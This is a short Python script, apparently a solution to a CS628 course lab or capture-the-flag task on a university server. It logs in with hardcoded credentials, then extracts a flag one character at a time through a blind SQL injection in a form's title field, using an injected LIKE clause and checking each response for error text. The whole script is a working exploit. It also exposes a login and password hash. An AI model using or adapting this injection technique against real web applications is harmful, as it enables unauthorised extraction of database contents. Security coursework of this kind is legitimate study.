import string
import requests

r = requests.Session()

res1 = r.post("https://cseproj91.cse.iitk.ac.in:9876/login.php",
                {'username':'abhivm', 'password':'4b17829aaefe6e135deabd3e85cbe782'}, verify=False)

arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', '{', '}']
string = ""
while True:
    for i in arr:
        cur = string + i
        res2 = r.post("https://cseproj91.cse.iitk.ac.in:9876/index.php",
                    {'title': "x' OR title LIKE 'cs628" + cur + "%", 'action' : 'submit'}, verify=False)
        if "OOPS" not in res2.text and "Incorrect" not in res2.text:
            string = string + i
            print string
